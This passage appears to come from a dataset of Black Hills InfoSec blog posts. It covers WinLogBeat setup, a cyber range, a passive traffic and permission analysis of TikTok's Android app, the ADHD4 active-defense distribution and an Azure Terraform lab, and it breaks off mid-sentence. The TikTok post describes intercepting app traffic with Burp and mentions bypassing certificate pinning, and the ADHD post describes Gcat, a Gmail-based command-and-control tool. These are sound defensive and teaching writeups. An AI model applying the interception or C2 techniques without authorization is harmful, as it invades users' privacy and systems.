https://github.com/DefensiveOrigins/APT06202001/tree/master/Lab-WinLogBeat \n\nThis config file, as was pointed out to us by a most gracious member of the community, that our Elastic instance utilizes Kafka for ingests. You may need to modify the last couple lines in the file to match up your network configuration. We have further altered the terms of the config file to include all WEC entries and event channel configuration. \n\nDownload the WinLogBeat installer https://www.elastic.co/downloads/beats/winlogbeat \n\nReplace the provided winlogbeat.yml file with the provided instance (you may need to check the IP address directive for the Logstash configuration at the very bottom of the file).  \n\nInstall the Shipper\n\nOpen a PowerShell session in the WinLogBeat directory and run the following commands.  \n\npowershell -Exec bypass -File .\\install-service-winlogbeat.ps1 \nSet-Service -Name \"winlogbeat\" -StartupType automatic \nStart-Service -Name \"winlogbeat\" \nGet-Service winlogbeat\n\nBeats is running. Check your Kibana install for logs. \n\nDone!!! \n\nThank you for getting this far. We appreciate all the support from the community including:\n\n@banjocrashland\n\n@strandjs\n\n@cyb3rward0g\n\n@olafhartong\n\nCheers!! And happy hunting!!!\n\nJordan and Kent \n\nBlack Hills InfoSec\n\nDefensive Origins\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"We Have Built a Cyber Range!\"\nTaxonomies: \"Author, Fun & Games, General InfoSec Tips & Tricks, Informational, InfoSec 101, John Strand, cyber range, john strand\"\nCreation Date: \"Mon, 20 Jul 2020 18:41:42 +0000\"\nJohn Strand //\n\nHello all!\n\nI wanted to take a few moments and share what we have been up to in conjunction with MetaCTF.\n\nWe have built a cyber range!  \n\nhttps://www.blackhillsinfosec.com/services/cyber-range/\n\nYes, I know very well that this is not interesting.  However, there are a couple of things that are pretty neat about it.\n\nFirst, it is free with every single WWHF training purchase.  \n\nPlease see a full list of our online training here:https://wildwesthackinfest.com/deadwood/training/\n\nWe really hate it when training has labs that are awesome, but just while you are in class.  We also think there is a need to constantly be upgrading your skills.  And, this is a great way to do it.\n\nFurther, it gives you something to do when you hit PowerPoint burnout. \n\nAlso, we are constantly adding new challenges to the range.  Here is our latest batch:https://www.blackhillsinfosec.com/services/cyber-range/cyber-range-updates/\n\nFinally, we are constantly adding new videos to the BHIS YouTube channel.  This is even cooler with the range because we are tying videos back to the range.  So, if you get stuck and need a hint, many of the challenges will tie back to a video explaining the concept in even more detail.  \n\nHere are some examples:\n\nhttps://www.youtube.com/watch?v=l2hN3Tluzi0&t=13s\n\nhttps://www.youtube.com/watch?v=TzG_iflIiig&t=10s\n\nhttps://www.youtube.com/watch?v=Xb52oX1wsn0&t=8s\n\nhttps://www.youtube.com/watch?v=eETUi-AZYgc&t=3s\n\nhttps://www.youtube.com/watch?v=hC3ANnUXn_o&t=69s\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Lets Talk About TikTok\"\nTaxonomies: \"Author, Derek Banks, Fun & Games, How-To, Informational, Derek Banks, TikTok\"\nCreation Date: \"Thu, 23 Jul 2020 14:03:35 +0000\"\nDerek Banks //\n\nI recently heard something on the news that caught my attention.  I suppose that isn\u2019t abnormal these days, but this in particular was the first time I had heard of anything like it.  The US Government was considering banning a popular application in use on mobile devices.  Not just on government devices, but for all Americans.\n\nThat app was TikTok.  Now, I am old enough where I only kind of know what TikTok is, something about sharing video clips over social media or something, apparently my kids like it\u2026 something something, get off my lawn...\n\nThe alleged reason given for banning such an app was that it was sending data on US citizens to the Chinese government.  The only thing close to this that I recall bubbling up to national news was a ban on Huawei devices for the same kind of fears.\n\nData privacy concerns and surveillance capitalism tactics are fascinating and complex topics that I think really deserve more attention.  I think that at this point in time, most infosec professionals would answer \u201cYes\u201d to the question \u201cDo your apps and devices spy on you?\u201d  But to what extent?\n\nThe intention of this blog is not to answer that question, that would probably take an entire book, but rather to cover a few core skills on how one could get started on the journey of mobile device and Android application analysis and answer that question for themselves.  \n\nWe will be sticking to passive kinds of analysis.  For example, we will attempt to identify network traffic and API calls, but we will not be sending manipulated data to the API servers.  We can look at the application and data on the device but should be really careful manipulating the application as it may do something unintended upstream.  There is a time and place for that kind of testing, and generally involves authorization to test the application in some form (a pen test or bug bounty program for example).\n\nAs luck would have it, I own a rooted Google 6P which is a Huawei manufactured Android phone.  I use it as a lab phone running Android 6.0 and Kali NetHunter and I use it mostly for Android application tests. \n\nI thought it would be interesting to take a look at what the network traffic looks like from the device.  And then afterward install TikTok and see what the communication looks like from it.\n\nDevice Baseline Analysis\n\nTo start, I wanted to see what remote hosts the phone attempted to connect to prior to installing TikTok.  I configured a Raspberry Pi 4 device that was part of a dropbox project that I did with Beau Bullock and Ralph May as an access point so that I could perform a packet capture of the device traffic.  \n\nTo get the WiFi access point running, I used a slightly modified version of the instructions David Fletcher published on our blog in 2017.  Once the wireless access point was functional, I associated the phone to the network then shut it off.  I then started tcpdump listening to the br0 interface and writing the packet capture out to file.  Next, I booted up the phone and let it sit idle for an hour while the pcap ran.  Note that there was not a SIM card in the phone, so it would not have an alternative but to use the WiFi access point.  Note that there were no other devices associated with the access point.\n\nThere are many options to analyze pcaps.  Wireshark is by far the most popular, and I use it quite a bit.  I also like to use command-line tools a fair amount too as in my opinion, they are easier to generate data that can be further processed. One of the techniques I like to start with when analyzing any network traffic is long and short tail analysis.  In other words, I like to see which hosts were communicated to the most, and which ones the least. This can be valuable at scale to find outliers in the data.  Tshark (the command line equivalent of Wireshark), can be used to generate this type of analysis.  First, we can look to see what DNS lookups were performed the most and the least by the device.\n\nIn our case, there were only 51 unique hosts, but there were still some interesting results.  As expected, there were a lot of requests for Google hosts.  It was, after all, a Google device and Operating system.  It should be obvious to all tech folks in 2020 that Google constantly tracks your location and behavior, but that is a different topic for a different time.  For this goal, I wanted to find something unexpected.  So let's run the same tshark command, but exclude \u201cgoogle\u201d and \u201cgstatic\u201d as a term.  \n\nThat gets the list of hosts down to 23.  Looking at the output, I think we could safely remove ytimg.com (YouTube) and ntp.org from the suspicious list.  Note that when I say suspicious list at this point of an analysis, I mean it warrants more investigation, not that I think it is malicious.  Malicious needs to be proven in my opinion.\n\nAs someone who has used cloudfront.net for relaying malware communications in the past, the 48 lookups to d2to8y50b3n6dq.cloudfront.net stuck out to me as something I would want to investigate as an analyst, same with akamaized.net.  I don\u2019t consider it a good idea to assume all Content Delivery Network (CDN) traffic to be benign.  Attackers want to hide in the noise and CDNs are a great place for that.\n\nUsing whois, the app-measurement.com domain appeared to be related to Google, so we can shelve that one for analysis purposes.  Also, I had Instagram on the phone, so we can ignore the related domains there too.  Though it is somewhat interesting that after a reboot, the device, without the Instagram app being opened, there are communication attempts to the related hosts (likely the APIs).\n\nThe xtrapath3.izatcloud.net domain appeared to be related to the Android operating system and the GPS configuration. So we\u2019re on to these weird-looking DNS lookups:\n\nqiqgyezmfcqf.example.org\n\noxxlgxxwtp.example.org\n\njmnqdgx.example.org\n\njmnqdgx\n\nqiqgyezmfcqf\n\noxxlgxxwtp\n\nThey sure do look like they would be related to something malicious, right?  Well, turns out, Chrome does this for a pretty good reason.  Some ISPs will respond to unresolved DNS requests with a page they control.  Often, these contain Ads.  Often, ad servers spread malware, and at the very least, users probably don\u2019t want to see the ads. Chrome will notice if these requests resolve the same A record and if so, block any corresponding ads.  This would be expected behavior on an Android phone.\n\nThe lightstep-collector.api.ua.com and identity.api.ua.com domains appeared to be related to Under Armor based on the whois information.  This can be explained since MapMyRun was installed on the device.\n\nThe insightapi.p3-group.com seemed harder to explain.  The whois information was protected by domain privacy.  Visiting the p3-group.com website, they appeared to be a tech consulting company, but the site was in WordPress, and while it looked \u201cnice\u201d, it's really not hard to stand up fake content in a WordPress site.  Not that I am saying it's not legitimate, only that I couldn\u2019t reasonably explain the traffic at this point of the analysis and thought it needed further looking into.  We will put that in the suspicious bin.\n\nThe cdn.ampproject.com domain appeared to be related to Google and accelerating searches on mobile devices.  That left the two reverse DNS lookups to 89.62.225.13 and 160.62.225.13. One seemed to be related to a telecom in Germany and a pharmaceutical company hosted at a german ISP.  I\u2019ve seen before where whois was not accurate, and an IP address was reassigned, but we will put that in the suspicious bin since it's not easily explained.\n\nSo from all the DNS hosts, the list of hosts that need more investigation were:\n\nD2to8y50b3n6dq.cloudfront.net\n\np3ins.akamized.net\n\n89.62.225.13.in-addr.arpa\n\n160.62.225.13.in-addr.arpa\n\nFor further investigation, we move to Wireshark and Burp Suite.  Opening the pcap up in Wireshark we can use filters to find the two lookups we are interested in.\n\ndns.qry.name == 160.62.225.13.in-addr.arpa\n\nIt appeared that both PTR records pointed to server-13-225-62-89.ewr53.r.cloudfront.net.\n\nThere was no other traffic to the IP addresses or the server-13-225-62-89.ewr53.r.cloudfront.net and addresses.  I still think that the reverse lookups were strange, but without additional traffic, it\u2019s difficult to say that malicious communication is happening.  The next step would be to attempt to find a reference to the IP addresses on the file system of the device to see what they may be associated with.  But we should run down the rest of the network traffic first.\n\nSince we have the pcap open in Wireshark, let's take a look at the protocol hierarchy and see if there are other protocols besides HTTP and TLS we should investigate.  This can be found under the Statistics menu.  It\u2019s expected that the vast majority of the traffic from the phone will be HTTP and TLS, though I have seen in the past where other protocols were in use.  In this case, HTTP, TLS, and ICMP appeared to be the only protocols we would want to investigate.\n\nAside from pinging the local network gateway, all of the ICMP traffic appeared to be ICMP Destination Port unreachable so not likely any kind of ICMP tunnel or other covert communications over ICMP. \n\nAt this point, we should start looking at HTTP/S traffic.  The best way to do this in my opinion would be to set up Burp Suite Professional as an intercepting proxy.  I suggest spending the money on the professional for any level of application testing as it is too valuable of a tool for the cost.  However, the community version should also be fine for just analyzing the requests and responses, which is mostly what we will be using it for.\n\nOnce Burp Suite has launched, you will want to configure the proxy to listen on a network that the mobile device is also on because the default is the localhost address where Burp is running.  Likely this is just the same WiFi network. This is found under the Options tab under the Proxy tab.\n\nConfigure a web browser (I recommend Firefox for web and application testing) on the system running Burp and configure it to use the proxy.  A handy tool for switching between the proxy settings and no proxy in Firefox is the FoxyProxy Standard extension.\n\nOnce the browser is configured, visit http://burp and click CA Certificate to download the CA cert.  Once downloaded, while you\u2019re here, import the certificate into Firefox\u2019s certificate store.  This is found under Preferences and Privacy and Security.  Click View Certificates, then Import and follow the prompts and select Use this certificate to identify websites.\n\nGetting the mobile device proxied through Burp Suite can be a little bit trickier depending on the version of Android in use.  There is a reason that I use Android 6.0 for testing whenever possible.  Starting with Android 7.0, the OS no longer honors the user certificate store to identify websites.  So using Android 6.0 for testing purposes is usually a bit easier.\n\nTo install the Burp Suite Certificate for Android 6.0:\n\nConfigure browser to use Burp and visit http://burp\n\nDownload cacert.der, rename to cacert.crt\n\nAdb push cacert.crt /mnt/sdcard/Download\n\nOn device \u2013 Settings>Security>Install from Storage, select cacert.crt\n\nIf you are using Android 7.0 and higher, you will need to install the certificate as a system-level cert.  The instructions here should help get you started.\n\nFrom the phone, to set the proxy up, go to advanced options of the connected WiFi network, then select manual for proxy settings, then enter the IP address and port that was configured in Burp Suite.\n\nOnce my phone was communicating through Burp, I rebooted it to see if the same traffic from the pcap would show up in Burp.  The D2to8y50b3n6dq.cloudfront.net domain appeared to be used to download a certificate store.  There were two files downloaded, cdnconfig.zip and truststore.zip.\n\nThe contents of the zip files correspond to what the URL stated, that purpose was to download certificate store contents.  This seemed to explain the D2to8y50b3n6dq.cloudfront.net and p3ins.akamized.net traffic.  Though I am not entirely sure how this is being used on the device when it is downloaded, it did not appear to be malicious.  However, I did not verify each CA in the truststore file.  If this was a corporate device, that effort may be worthwhile.\n\nAt this point, I felt pretty comfortable that at least for the hour the packet capture was running, that there was no data being siphoned from the phone without my knowledge or some other kind of compromise or malware.  Does this mean that I am 100% sure that something doesn\u2019t check in to a command and control server once a day or once a month?  Not at all, but I am fairly confident that the device isn\u2019t actively compromised.\n\nApp Analysis\n\nNow on to TikTok.  Before installing it from the Google Play Store, I used ADB to list the installed packages on the phone.  \n\nadb shell \u2018pm list packages \u2013f\u2019\n\nI started doing this on app assessments, because sometimes the app isn\u2019t named something obvious.  Then I installed TikTok from the Play Store and tried to find it with ADB.  Sure enough, it was not named anything related to TikTok.\n\nI created two text lists and used Python to find the difference between them.  The name of the app was com.zhiliaoapp.musically. Note that after the fact, I realized I totally forgot about the command line utility diff.  I have had Python on the brain for the last few months, and when you have a hammer everything looks like a nail.\n\nNext, I used ADB to locate the base APK and pull it from the device for static analysis using the following steps:\n\nadb shell pm path com.zhiliaoapp.musically\n\nadb pull /data/app/com.zhiliaoapp.musically-1/base.apk path/to/desired/destination\n\nOnce the APK file was copied off, I processed it in MobSF to get an overview of the app with automated static analysis.  I like starting mobile application assessments with MobSF because it automates some tasks that I would otherwise need to perform manually.\n\nThe application appeared to be relatively complex with 16 exported activities, 22 exported services, 22 exported receivers, and 4 providers.  An activity is a user interaction, sort of like an application on a Windows OS, where the user interacts with the application.  A service is a background task to perform some kind of operation.  Broadcast receivers send and receive messages to other Android apps or the Android OS.  Content providers manage data by the app and help share data with other apps.\n\nAll of these were essentially the attack surface area of the application and could be manipulated in some unintended way.  The best way to do that in my opinion is to use the Drozer framework.\n\nIt turned out that TikTok was a relatively large application, most of the Android apps I have analyzed in penetration tests have about a quarter of this size of attack surface area.  Analyzing these in detail will have to be a later blog post because of the number of them and that they may not help us answer our original question - what, if any, personal data is being sent from the application?\n\nMobSF can provide some interesting information along these lines, as it extracts permission information from the Android manifest.  It can be difficult to ascertain if apps are overly permissive and if there are permissions granted that shouldn\u2019t be necessary, but as with the size of exported intents, there were a lot of declared permissions.  There were 67 declared permissions.  In comparison to other apps I have analyzed, this was a relatively large amount.\n\nPERMISSIONDESCRIPTIONandroid.permission.INTERNETAllows an application to create network sockets.android.permission.ACCESS_NETWORK_STATEAllows an application to view the status of all networks.android.permission.READ_EXTERNAL_STORAGEAllows an application to read from SD Card.android.permission.WRITE_EXTERNAL_STORAGEAllows an application to write to the SD card.android.permission.ACCESS_WIFI_STATEAllows an application to view the information about the status of Wi-Fi.android.permission.CAMERAAllows application to take pictures and videos with the camera. This allows the application to collect images that the camera is seeing at any time.android.permission.RECORD_AUDIOAllows application to access the audio record path.android.permission.FLASHLIGHTAllows the application to control the flashlight.android.permission.WAKE_LOCKAllows an application to prevent the phone from going to sleep.android.permission.GET_TASKSAllows application to retrieve information about currently and recently running tasks. May allow malicious applications to discover private information about other applications.android.permission.READ_CONTACTSAllows an application to read all of the contact (address) data stored on your phone. Malicious applications can use this to send your data to other people.android.permission.RECEIVE_BOOT_COMPLETEDAllows an application to start itself as soon as the system has finished booting. This can make it take longer to start the phone and allow the application to slow down the overall phone by always running.none.used.ACCESS_FINE_LOCATIONAccess fine location sources, such as the Global Positioning System on the phone, where available. Malicious applications can use this to determine where you are and may consume additional battery power.none.used.ACCESS_COARSE_LOCATIONAccess coarse location sources, such as the mobile network database, to determine an approximate phone location, where available. Malicious applications can use this to determine approximately where you are.android.permission.VIBRATEAllows the application to control the vibrator.com.meizu.c2dm.permission.RECEIVEUnknown permission from android referencecom.zhiliaoapp.musically.permission.READ_ACCOUNTUnknown permission from android referencecom.zhiliaoapp.musically.permission.WRITE_ACCOUNTUnknown permission from android referencecom.android.launcher.permission.INSTALL_SHORTCUTAllows an application to install a shortcut in Launcher.com.android.launcher.permission.UNINSTALL_SHORTCUTDon't use this permission in your app. This permission is no longer supported.com.android.launcher.permission.READ_SETTINGSUnknown permission from android referenceandroid.permission.AUTHENTICATE_ACCOUNTSAllows an application to use the account authenticator capabilities of the Account Manager, including creating accounts as well as obtaining and setting their passwords.com.htc.launcher.permission.READ_SETTINGSUnknown permission from android referencecom.lge.launcher.permission.READ_SETTINGSUnknown permission from android referencecom.lge.launcher.permission.WRITE_SETTINGSAllows an application to modify the system's settings data. Malicious applications can corrupt your system's configuration.com.huawei.launcher3.permission.READ_SETTINGSUnknown permission from android referencecom.huawei.launcher3.permission.WRITE_SETTINGSAllows an application to modify the system's settings data. Malicious applications can corrupt your system's configuration.com.huawei.launcher2.permission.READ_SETTINGSUnknown permission from android referencecom.huawei.launcher2.permission.WRITE_SETTINGSAllows an application to modify the system's settings data. Malicious applications can corrupt your system's configuration.com.ebproductions.android.launcher.permission.READ_SETTINGSUnknown permission from android referencecom.ebproductions.android.launcher.permission.WRITE_SETTINGSAllows an application to modify the system's settings data. Malicious applications can corrupt your system's configuration.com.oppo.launcher.permission.READ_SETTINGSUnknown permission from android referencecom.oppo.launcher.permission.WRITE_SETTINGSAllows an application to modify the system's settings data. Malicious applications can corrupt your system's configuration.com.huawei.android.launcher.permission.READ_SETTINGSUnknown permission from android referencecom.huawei.android.launcher.permission.WRITE_SETTINGSAllows an application to modify the system's settings data. Malicious applications can corrupt your system's configuration.dianxin.permission.ACCESS_LAUNCHER_DATAUnknown permission from android referencecom.miui.mihome2.permission.READ_SETTINGSUnknown permission from android referencecom.miui.mihome2.permission.WRITE_SETTINGSAllows an application to modify the system's settings data. Malicious applications can corrupt your system's configuration.com.zhiliao.musically.livewallpaper.permission.wallpaperpluginUnknown permission from android referencecom.zhiliaoapp.musically.permission.MIPUSH_RECEIVEUnknown permission from android referencecom.zhiliaoapp.musically.push.permission.MESSAGEUnknown permission from android referencecom.android.vending.BILLINGUnknown permission from android referencecom.meizu.flyme.push.permission.RECEIVEUnknown permission from android referenceandroid.permission.WRITE_SYNC_SETTINGSAllows an application to modify the sync settings, such as whether sync is enabled for Contacts.com.sec.android.provider.badge.permission.READUnknown permission from android referencecom.sec.android.provider.badge.permission.WRITEUnknown permission from android referencecom.htc.launcher.permission.UPDATE_SHORTCUTUnknown permission from android referencecom.sonyericsson.home.permission.BROADCAST_BADGEUnknown permission from android referencecom.sonymobile.home.permission.PROVIDER_INSERT_BADGEUnknown permission from android referencecom.majeur.launcher.permission.UPDATE_BADGEUnknown permission from android referencecom.huawei.android.launcher.permission.CHANGE_BADGEUnknown permission from android referenceandroid.permission.MODIFY_AUDIO_SETTINGSAllows application to modify global audio settings, such as volume and routing.android.permission.REQUEST_INSTALL_PACKAGESMalicious applications can use this to try and trick users into installing additional malicious packages.android.permission.REORDER_TASKSAllows an application to move tasks to the foreground and background. Malicious applications can force themselves to the front without your control.com.zhiliaoapp.musically.miniapp.PROCESS_COMMUNICATIONUnknown permission from android referencecom.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICEUnknown permission from android referencecom.google.android.c2dm.permission.RECEIVEUnknown permission from android referencecom.zhiliaoapp.musically.permission.RECEIVE_ADM_MESSAGEUnknown permission from android referencecom.amazon.device.messaging.permission.RECEIVEUnknown permission from android referenceandroid.permission.USE_CREDENTIALSAllows an application to request authentication tokens.android.permission.MANAGE_ACCOUNTSAllows an application to perform operations like adding and removing accounts and deleting their password.android.permission.READ_APP_BADGEUnknown permission from android referenceme.everything.badger.permission.BADGE_COUNT_READUnknown permission from android referenceme.everything.badger.permission.BADGE_COUNT_WRITEUnknown permission from android referenceandroid.permission.UPDATE_APP_BADGEUnknown permission from android referencecom.vivo.notification.permission.BADGE_ICONUnknown permission from android reference\n\nThere were a few permissions that seemed odd to me for an app that has a purpose of sharing short video clips online.  The android.permission.AUTHENTICATE_ACCOUNTS allows for the creation of accounts and setting passwords.  I would question why that would be necessary (and I have never seen that in other apps).  Then the 16 specific settings for modifying system data - I would also wonder why those would be necessary.  But again, it can be hard to determine from the outside looking in what functionality requires these.  If I had to make a yes or no decision on if the app was overly permissive, I would say yes.\n\nSince the phone was set up to use Burp as a proxy and the Burp CA installed and trusted we can move on to network traffic inspection.  When the app was launched, the application traffic was intercepted.  I went through the initial \u201cwhat am I interested in\u201d choices and created an account and started watching a few videos and using the app for a few minutes.\n\nNext, I saved all HTTP requests intercepted by Burp to a file and used command line tools to get an idea of how many hosts were involved in communication from the app.  Using command-line utilities, I counted 32 hosts that appeared to be related to TikTok network traffic.  For the most part, I found these through manual analysis of the Proxy traffic listed in Burp and used the domains as search terms with grep on the command line to get an easier parse text list.\n\nThere were many GET requests to TickTok APIs profiling my device, but this is not uncommon for developers to do.  Metrics for install base can be useful.  But, it could definitely be viewed as data collection.\n\nI also noticed something odd in the sense that I have not seen this with other apps that I have analyzed (*Note that the vast majority of the apps I look at are for work engagements).  It appeared that most of the HTTP message bodies for API calls were encrypted.\n\nWhy do I say that the data being sent was encrypted?  I have seen where API requests were gzip compressed, but I have been able to look through the requests and find where the compressed file began and decode the traffic.  \n\nTo investigate this, I looked for the beginning of requests to hosts based on the time I launched the app and right-clicked on the message body and selected \u201cSend to Decoder\u201d.  This sends the request to the Burp Suite decoder which allows you to choose various types of decoding.  I was not able to locate a portion of data that was able to be decoded.\n\nThe requests in Burp can be saved to file by right-clicking in the proxy window and selecting Save Item.  The request will be base64 encoded and can be decoded at the command line by:\n\n$echo \u201c file_name\n\nNext, take the HTTP header information out of the saved file, and you are left with the message body.  Using the file utility on the file results in \u201cdata\u201d returned (no file magic bytes to discover).\n\nI used the ent utility to check the entropy of a few of the larger message bodies and it appeared to be encrypted.\n\nAt this point, the best option to break the encryption would be to do some in-depth static analysis on the extracted APK and figure out how encryption is implemented and write some code to decrypt it.  That\u2019s a bit beyond the scope of this post.\n\nAt this point in the analysis though, if I were performing a risk analysis for allowing the app on company devices, I think there would be enough data to decide against it.  But what about banning TikTok from the general public?  My opinion is that without breaking the encryption, it would be hard for me to say.  My guess is that it was decrypted by someone and that data was being collected was viewed as an invasion of privacy.\n\nTo play Devil\u2019s Advocate though, what if we looked at other popular apps with huge install bases?  Apps like Instagram, Twitter, Snapchat, or Facebook?  They collect some amount of personal data.  We are in the Age of Surveillance Capitalism, selling human behavior for targeted advertising is how money is made for these companies.  What data are they sending?\n\nGetting at the data sent by these other popular social media apps is even more difficult, as they are using a technique called Certificate Pinning to defeat traffic inspection.  This is where a specific certificate is embedded in the application to establish TLS encrypted communication, and if that certificate is not used (as in our case with using the Burp certificate) then communication is not established. \n\nTo defeat Certificate Pinning, one would need to inject code into the application at runtime (using something like Frida) to remove or bypass the pinning code or decompile the app and edit smali files and repackage the app and install the modified app.  Neither option is a trivial exercise.  \n\nPersonally, I think it's safe to assume as a user for any popular app, that personal data from your phone is being sent to any of these companies.  Does it matter where the company is headquartered?  Perhaps for some, perhaps not for most others.  At the end of the day, I think that the majority of people have no real idea how much their privacy is compromised by apps on their mobile devices, but that is a conversation for another day and another blog post.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Now Thats What I Call ADHD! 4\"\nTaxonomies: \"Author, How-To, Informational, James Marrs, moth, ADHD\"\nCreation Date: \"Mon, 27 Jul 2020 13:42:52 +0000\"\nmoth & James Marrs //\n\nIntroduction\n\nAfter a month of hard work, Python headaches, dependency hell, and a bit of tool necromancy, ADHD4 is here and we\u2019re thrilled to share it with the community! This version features tools upgraded from Python 2 to Python 3, a fancy new applications menu, updated/reorganized documentation, and more.\n\nWhat\u2019s This?\n\nADHD stands for Active Defense Harbinger Distribution. The driving idea of this security image is to actively defend your environment from a malicious attacker. Want to leave an attacker clueless as to what ports are open? ADHD has a tool for that. Want to trick an attacker into falling into a honeypot with a fake file system that doesn\u2019t let them leave? ADHD has a tool for that as well. ADHD is not meant to replace other security solutions; the goal is to supplement them with tools that can make an attacker\u2019s life really difficult. Think of it as a mixtape of some of our favorite tools for active defense.\n\nWhat\u2019s Old?\n\nIf you\u2019re already familiar with ADHD3, we\u2019ve attempted to replicate configurations between versions, and we think we\u2019ve done a rather good job at it. Credentials for the user and the databases have remained the same, and tool directory structures in /opt have remained the same as well. The documentation repository has seen many files changed and rebased, but the links have been updated to make this as hidden as possible. In addition, there\u2019s a handful of tools that have remained the same between versions, so it\u2019s easy to hop back in right where you left off. If you\u2019ve not previously used ADHD, you can find credential information at https://adhdproject.github.io/#!ADHD/Credentials.md.\n\nWhat\u2019s New?\n\nThere is a lot of new stuff in ADHD4. A new OS, updated tools with new features, a shiny application menu similar to Kali\u2019s, and the list goes on. Let\u2019s start with all the Python tools that got updated to Python 3. \n\nTool Upgrades\n\nGcat\n\nYou may remember Gcat, a program for establishing and managing C2 channels through Gmail. It hadn\u2019t been updated in a long while, and the alternatives listed in the README were still using Python 2. Gcat is a tool written by one of our own, so we opted to resurrect it. After a bit of work, Gcat now works in Python 3.8. Only two features haven\u2019t been verified (keylogging, shellcode execution), but we imagine we\u2019re not quite done with development.\n\nCowrie\n\nCowrie is a medium-interactivity honeypot that spoofs an ssh server to catch and log attacker interactions. Cowrie was a bit of a special case to upgrade. Cowrie is already written in Python 3 and is an evolution of a similar Python 2 tool named Kippo. The author of Cowrie removed a feature present in Kippo that we find desirable: preventing attackers from exiting the honeypot. Rather than upgrading Kippo to Python 3, we decided it was easier to graft the feature over from Kippo to Cowrie.\n\nSpidertrap\n\nSpidertrap is a simple tool designed to catch web crawlers. It works by generating an endless maze of links that leads to yet another endless maze. Spidertrap was relatively painless to upgrade. Most of the process was replacing print statements with print function calls.\n\nWordpot\n\nWordpot is a honeypot that mimics a real wordpress install. It is highly customizable through the use of templates. Upgrading Wordpot wasn\u2019t too bad. Most of the work had to do with syntax differences and updated libraries. There were a few issues with using different templates, but after some digging these were easy enough to fix.  After verifying the functionality of the tool with the updates, we forked the tool into the ADHD repository.\n\nRubberglue\n\nRubberglue is a tool that reflects attacker traffic back to the attacker. Thanks to the use of the __future__ import, changes to Rubberglue were minimal. After tweaking the imports and blowing the dust off, it was ready to go.\n\nOperating System\n\nADHD4 now uses Ubuntu 20.04 LTS as its operating system. We went with Ubuntu because a lot of the tools seem to work best with this flavor of linux, and we frankly needed a break from the old version of Linux Mint of past ADHD versions. Choosing Ubuntu 20.04 LTS ensures that ADHD4 will have at least five years of future OS updates. We were also able to take advantage of Ubuntu\u2019s menu bar and create a totally awesome applications menu. The applications menu was lovingly inspired by a similar menu in Kali Linux, and was designed to emulate it as closely as possible. If you are familiar with Kali Linux, we imagine using ADHD\u2019s applications menu will feel similar. When using the applications menu, many tools will open a terminal in the tool directory and print the tool\u2019s usage. This makes it very easy for beginners to run and learn how to use the tools. For some tools that run as services, entries exist to start, stop, and view the status of the service.\n\nTool Removal\n\nUnfortunately, we also had to remove several tools. The following list shows all the tools that we had to remove from ADHD: Cryptolocked, Invisiport, SQLite Bug Server, HoneyBadger Red, Docz.py, Human.py, Lockdown, OpenBAC, Simple-Pivot-Detect, Sweeper, TALOS, HoneyDrive, and all Windows tools\n\nYou may notice that the list of removed tools is rather long. Killing old tools certainly doesn\u2019t give us a warm and fuzzy feeling, so we\u2019re looking to expand the current tool list. \n\nGet Involved!\n\nWant to get involved with ADHD? Here\u2019s how!\n\nTool Suggestions\n\nWant to see one of your favorite tools added to a future version of ADHD? Open an issue on the Awesome Active Defense repository at https://github.com/adhdproject/awesome-active-defense and suggest a tool. Be sure to mention @0x6d6f7468 or @martianjay in your issue details to get our attention. We\u2019re looking forward to adding tools provided by the community.\n\nDocumentation Contributions\n\nNotice something wonky in one of the repositories? Feel free to open an issue or submit a pull request. Again, please be sure to mention @0x6d6f7468 or @martianjay so we see the requests quickly.\n\nGitHub Repositories\n\nBefore downloading the ADHD image, there are several resources you can check out on GitHub for more information. To see the project on GitHub, go to https://github.com/adhdproject. This project contains repositories for all of the tools we have forked and modified, as well as the documentation repository at https://github.com/adhdproject/adhdproject.github.io and the tool list repository https://github.com/adhdproject/awesome-active-defense. To view ADHD\u2019s documentation, browse to https://adhdproject.github.io.\n\nDiscord\n\nIn addition to GitHub, we will also be available on the BHIS Discord server, which you can join by browsing to https://discord.gg/TPNn833. This invite link will bring you to the new #adhd channel. Mention @moth or @martianjay to say hello! We\u2019re looking forward to having some great conversations there.\n\nDownload ADHD\n\nWe\u2019ve left you in suspense long enough and we can practically hear you shouting \u201cbut guys, where can I download ADHD4?!\u201d. Fret not, friends! If you want to take ADHD4 for a spin, you can find it at https://adhdhost.s3.amazonaws.com/ADHD4/ADHD4-sha1.ova. \n\nUpon downloading ADHD4, we strongly recommend that you validate your download by comparing the file's signature against at least one of the following hashes:\n\nFilename: ADHD4-sha1.ovaMD5: 3b0cc1846f86acac875679aaabdc8552SHA1: 19f9f8e2be0fceffaf6e177123f78d896e0850bdSHA256: b461505166a930b5503f19a9a9e500abe62c924234dbc160f3fa5b2e7c204a5c\n\nOn Windows, you can get the hash of a file by running any of the following three commands in PowerShell:\n\nGet-FileHash -Algorithm MD5 .\\ADHD4-sha1.ovaGet-FileHash -Algorithm SHA1 .\\ADHD4-sha1.ovaGet-FileHash -Algorithm SHA256 .\\ADHD4-sha1.ova\n\nTo do the same on MacOS or Linux, run any of the following three commands in a terminal:\n\nmd5sum ADHD4-sha1.ovasha1sum ADHD4-sha1.ovasha256sum ADHD4-sha1.ova\n\nWe hope you enjoy it!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How To: Applied Purple Teaming Lab Build on Azure with Terraform (Windows DC, Member, and HELK!)\"\nTaxonomies: \"Author, How-To, Informational, Jordan Drysdale, Kent Ickler, Azure, Detection Lab, Jordan Drysdale, Kent Ickler, purple teaming, Terraform\"\nCreation Date: \"Mon, 03 Aug 2020 15:31:24 +0000\"\nJordan Drysdale & Kent Ickler //\n\ntl;dr\n\nUbuntu base OS, install AZCLI, unpack terraform, gather auth tokens, run script, enjoy new domain. \n\nhttps://github.com/DefensiveOrigins/APT-Lab-Terraform\n\nFor those of you who have been diligently following along - three webcasts now, a four-hour intro training session on a Saturday, our students who have attended the virtual courses - it has been written. The labs are now available for your use and deployment on Azure with a few reasonable steps. The instructions below will spin up three systems on Azure with Terraform to mirror the classroom environment we preach (DC + member + HELK). They have the same IPs, same creds, everything you\u2019ve gotten used to. \n\nThe steps are listed below and assume you have an account on Microsoft Azure. If you do not already have one, visit here and claim your $200 in credits: https://azure.microsoft.com/en-us/free/\n\nIf my math is close, you can run the lab built by the instruction set below for about 30 days on just the credits. Anyway, thanks for reading, following along, and keeping up with our efforts.\n\nStep 1\n\nNew Ubuntu 18.04 on Digital Ocean at 